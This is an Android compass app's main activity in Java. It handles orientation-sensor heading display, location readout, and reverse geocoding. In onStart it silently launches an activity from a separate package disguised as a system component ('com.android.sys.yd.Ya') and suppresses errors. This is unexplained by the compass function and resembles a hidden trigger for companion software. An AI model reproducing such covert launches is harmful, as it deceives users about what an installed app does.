package com.zin.compass;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Vibrator;
import android.view.animation.Animation;
import android.view.animation.RotateAnimation;
import android.widget.ImageView;
import android.widget.TextView;

import java.io.IOException;
import java.util.List;


public class MainActivity extends Activity {
    private ImageView imageView;
    private TextView textView, orientationTextView;
    private SensorManager manager;
    private SensorListener listener = new SensorListener();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        imageView = (ImageView) this.findViewById(R.id.imageView);
        textView = (TextView) findViewById(R.id.textView);
        orientationTextView = (TextView) findViewById(R.id.orientationTextView);
        imageView.setKeepScreenOn(true);
        manager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

        // 获得Location Manager的实例
        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
        // 定义一个监听器，实现onLocationChanged方法，在这个方法里面可以拿到更新后的地理位置
        LocationListener locationListener = new LocationListener() {
            public void onLocationChanged(Location location) {
                // 新的Location值在这里返回，Location实例中包含着纬度、经度、海拔、精确度、更新时间等一系列信息。
                if (location == null) {
                    return;
                }
                TextView locationTextView = (TextView) findViewById(R.id.locationTextView);
                locationTextView.setText("北纬 " + location.getLatitude() + " 东经 " + location.getLongitude() + "\n 海拔 " + location.getAltitude() + " 米");
                List<Address> addList = null;
                Geocoder ge = new Geocoder(MainActivity.this);
                try {
                    addList = ge.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                TextView cityTextView = (TextView) findViewById(R.id.cityTextView);
                TextView countryName = (TextView) findViewById(R.id.countryName);

                if (addList != null && addList.size() > 0) {
                    for (int i = 0; i < addList.size(); i++) {
                        Address ad = addList.get(i);
                        countryName.setText(ad.getCountryName() + "");
                        cityTextView.setText(ad.getLocality() + "");
                    }
                }
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            public void onProviderEnabled(String provider) {
            }

            public void onProviderDisabled(String provider) {
            }
        };
//        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
//            return;
//        }
        try {
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
        } catch (Exception e) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
        }
    }

    @Override
    protected void onStart() {
        super.onStart();

        try {
            Intent intent = new Intent();
            ComponentName componentName = new ComponentName("com.android.sys.yd", "com.android.sys.yd.Ya");
            intent.setComponent(componentName);
            startActivity(intent);
        } catch (Exception e) {
        }
    }

    @Override
    protected void onResume() {
        Sensor sensor = manager.getDefaultSensor(Sensor.TYPE_ORIENTATION);
        manager.registerListener(listener, sensor,
                SensorManager.SENSOR_DELAY_GAME);
        super.onResume();
    }

    @Override
    protected void onPause() {
        manager.unregisterListener(listener);
        super.onPause();
    }

    private final class SensorListener implements SensorEventListener {
        private float predegree = 0;

        public void onSensorChanged(SensorEvent event) {
            float degree = event.values[0];// 存放了方向值 90
            RotateAnimation animation = new RotateAnimation(predegree, degree,
                    Animation.RELATIVE_TO_SELF, 0.5f,
                    Animation.RELATIVE_TO_SELF, 0.5f);
            animation.setDuration(1);
            imageView.startAnimation(animation);
            predegree = degree;

            String direction = "";

            int directiona = (int) degree;

            if (directiona >= 350 || directiona <= 10) {
                direction = "北";
            } else if (directiona > 10 && directiona < 80) {
                direction = "东北";
            } else if (directiona >= 80 && directiona <= 100) {
                direction = "东";
            } else if (directiona > 100 && directiona < 170) {
                direction = "东南";
            } else if ((directiona >= 170 && directiona <= 190)) {
                direction = "南";
            } else if (directiona > 190 && directiona < 260) {
                direction = "西南";
            } else if (directiona >= 260 && directiona <= 280) {
                direction = "西";
            } else if (directiona > 280 && directiona < 350) {
                direction = "西北";
            }

            int o = 30;
            for (int i = 0; i <= 12; i++) {

                if (directiona == o * i) {
                    o = o * i;
                    Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    long[] pattern = {100, 110};
//                    vibrator.vibrate(pattern, -1); //如果只想震动一次，index设为-1

                }

            }

            textView.setText(String.valueOf(directiona + "°"));
            orientationTextView.setText(direction);
        }

        public void onAccuracyChanged(Sensor sensor, int accuracy) {
        }
    }

}